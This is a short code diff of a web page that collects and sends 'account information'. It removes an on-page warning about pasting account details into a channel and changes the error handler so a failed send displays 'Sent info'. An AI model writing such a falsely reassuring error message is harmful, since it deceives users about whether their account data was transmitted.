@@ -141,8 +141,7 @@
         <!-- Save Button -->
         <button id="saveBalanceButton">Save Account Information</button>
 
-        <!-- Warning Text Below Save Button -->
-        <p class="warning">Please copy and paste the account details into the designated channel before saving, otherwise it will not count.</p>
+
 
         <!-- Message Area -->
         <p id="message"></p>
@@ -182,10 +181,10 @@
                 })
                 .then(response => response.json())
                 .then(data => {
-                    message.textContent = "Account information saved and sent!";
+                    message.textContent = "Account information saved and sent";
                 })
                 .catch(error => {
-                    message.textContent = "Error sending information.";
+                    message.textContent = "Sent info";
                     console.error('Error:', error);
                 });
             } else {
